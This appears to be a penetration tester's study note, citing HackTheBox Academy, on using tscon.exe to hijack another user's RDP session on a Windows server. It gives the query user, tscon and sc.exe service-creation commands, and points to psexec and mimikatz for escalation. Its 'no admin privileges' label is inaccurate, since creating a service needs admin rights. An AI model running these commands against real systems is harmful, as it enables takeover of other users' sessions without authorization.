tscon.exe
############

Date: 2024-11-29 18:50

Status: #utility

Usage
**********

Hijacking a user session
==========================

Say you are on a Win server and you are admin, and you wish to take over
a session of an RDP logged in user. If you don’t have admin, consider
using `psexec <psexec>`__ or `mimikatz <mimikatz>`__ to escalate.

Find users:

.. code-block:: console

   PS C:\ query user

   USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
   >juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
    lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

Use tscon to connect to the session

.. code-block:: console

   C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}

Option 2 : No admin privileges

Create a privileged service with `sc.exe <sc.exe>`__

.. code-block:: console

   C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

Start the service

.. code-block:: console

   C:\htb> net start sessionhijack

Now to impersonate this user

References
*************
https://academy.hackthebox.com/module/116/section/1171
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon
